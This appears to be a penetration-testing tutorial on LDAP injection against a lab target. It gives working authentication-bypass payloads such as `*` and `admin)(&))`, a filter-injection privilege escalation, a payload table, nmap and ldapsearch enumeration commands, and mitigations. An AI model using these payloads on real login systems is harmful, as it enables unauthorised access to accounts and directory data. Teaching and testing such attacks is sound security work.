## LDAP and LDAP Injection

LDAP (Lightweight Directory Access Protocol) is a client-server protocol for querying and modifying directory services over TCP/IP, typically on port 389 (plain) or port 636 (LDAPS).  It is the backbone of authentication in most enterprise environments, used by Active Directory, OpenLDAP, and countless web applications that delegate login checks to a directory service. The core risk during a penetration test is that unsanitised user input passed into LDAP queries can completely bypass authentication or expose directory data in ways analogous to SQL injection. 
***

## LDAP vs Active Directory

| Feature | LDAP | Active Directory |
|---|---|---|
| Type | Open protocol (RFC 4511) | Proprietary Microsoft directory service |
| Platform | Cross-platform | Windows only |
| Authentication | Simple bind, SASL | Kerberos (primary), NTLM, LDAP over TLS |
| Schema | Extensible, admin-defined | Predefined X.500 extension with Windows-specific classes |
| Standalone | Yes | Requires DNS and Kerberos to function |

***

## How LDAP Queries Work

An LDAP query is built from a base DN, a scope, and a filter. A typical authentication query in a PHP web application looks like: 

```
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```

The server evaluates the entire filter. If all conditions are true, authentication succeeds. If input is not sanitised before being embedded into the filter string, the attacker controls the logic of that query.

***

## LDAP Injection Techniques

### Wildcard Authentication Bypass

The simplest form. Injecting `*` into both the username and password fields rewrites the query to: 
```
(&(objectClass=user)(sAMAccountName=*)(userPassword=*))
```

This matches every user in the directory. The server returns the first result and grants access regardless of which specific account it is.

### Boolean Injection to Bypass Password Check

A more targeted technique using control characters to close the query early. Injecting `validuser)(&))` as the username with any value as the password constructs: 

```
(& (USER=validuser)(&))(PASSWORD=anystring))
```

OpenLDAP only processes the first filter `(&(USER=validuser)(&))`. The `(&)` is an always-true boolean AND, so the password field is never evaluated. The attacker logs in as `validuser` with no valid password. 
### Privilege Escalation via Filter Injection

Consider a query enforcing access control at the end:

```
(&(directory=docs)(security_level=guest))
```

Injecting `docs)(security_level=*))(&(directory=docs` as the `directory` value creates:

```
(&(directory=docs)(security_level=*))(&(directory=docs)(security_level=guest))
```

The wildcard in the first filter matches all security levels. OpenLDAP evaluates the first successful match and ignores the second, granting access to all security levels rather than just guest. 
***

## Common Injection Payloads

| Payload | Effect |
|---|---|
| `*` | Wildcard, matches any value |
| `*)(&` | Closes the current filter, appends always-true AND |
| `*)(uid=*))(|(uid=*` | Authentication bypass via always-true double condition |
| `)(objectClass=*` | Dumps all object classes |
| `admin)(&))` | Logs in as admin with any password |

***

## Enumeration

Scan for LDAP on the standard port alongside the web service:

```bash
nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
```

```
80/tcp  open  http    Apache httpd 2.4.41 (Ubuntu)
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
```

With both a web application on port 80 and OpenLDAP on port 389 present, it is reasonable to assume the web app delegates its authentication to the LDAP service. 

### Manual Verification with ldapsearch

Confirm anonymous binding is enabled (a prerequisite for many injection attacks):

```bash
ldapsearch -H ldap://10.129.204.229:389 -x -b "dc=example,dc=com" "(objectClass=*)"
```

If results return without credentials, anonymous binding is on. This is a serious misconfiguration on its own.

Authenticated query syntax for reference:

```bash
ldapsearch -H ldap://ldap.example.com:389 \
  -D "cn=admin,dc=example,dc=com" \
  -w secret123 \
  -b "ou=people,dc=example,dc=com" \
  "(mail=john.doe@example.com)"
```

***

## Hands-On: Authentication Bypass

With OpenLDAP confirmed on the backend, navigate to the web application login form and submit:

- Username: `*`
- Password: `*`

The resulting LDAP query becomes `(&(uid=*)(password=*))`, which matches every entry in the directory and returns the first user account.  Login succeeds without any valid credentials, confirming the application is vulnerable. [cobalt](https://www.cobalt.io/blog/introduction-to-ldap-injection-attack)

To target a specific account such as admin, use:

- Username: `admin)(&))`
- Password: `anything`

This bypasses the password check entirely for the admin account specifically.

***

## Mitigation

Three controls eliminate LDAP injection risk: 

1. Escape all LDAP special characters (`*`, `(`, `)`, `\`, `NUL`) in user input before embedding it in a filter string
2. Use parameterised LDAP queries where the library handles input encoding rather than string concatenation
3. Disable anonymous binding on the directory server unless explicitly required, and enforce authentication before any query is processed
